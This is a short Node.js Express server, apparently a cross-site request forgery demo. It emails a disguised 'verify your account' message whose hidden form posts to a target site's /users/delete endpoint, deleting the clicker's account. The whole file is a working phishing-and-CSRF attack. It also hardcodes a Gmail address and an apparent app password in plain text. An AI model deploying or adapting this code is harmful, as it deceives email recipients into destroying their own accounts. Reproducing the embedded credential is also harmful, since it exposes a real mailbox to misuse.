const express = require("express");
const nodemailer = require("nodemailer");

const app = express();

const VICTIM_URL = "http://localhost:5000";
// const VICTIM_URL = "http://localhost:8000";

const html = `
    <div>
      <form action="${VICTIM_URL}/users/delete" method="post">
        <input value="Confirm to delete" name="typetext" type="hidden" />
        <p>Please don't reply to this mail and follow the button below</p>
        <button type = "submit" style="background-color: #222; color: white; padding: 8px 16px;
            border-radius: 5px; cursor: pointer;">
          Click on this button to verify your account
        </button>
      </form>
    </div>
`;

app.use(express.json());

app.get("/mail/:email", async (req, res) => {
    console.log("Sending verification mail to the user");

    const email = req.params.email;

    // sending a mail with nodemailer
    let transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: "stockhub.pvt.ltd@gmail.com",
            pass: "ldtygrlfvrvoougf",
        },
    });

    let mailOptions = {
        from: "stockhub.pvt.ltd@gmail.com",
        to: email,
        subject: "Verify your account",
        html: html,
    };

    transporter.sendMail(mailOptions, (err, success) => {
        if (err) {
            console.log("Mail not sent", err);
        } else {
            console.log("Success, email has been sent", success);
        }
    });

    return res.status(200).json({ message: "OTP sent" });
});

app.listen(9000, () => {
    console.log("Server listening at 9000");
});
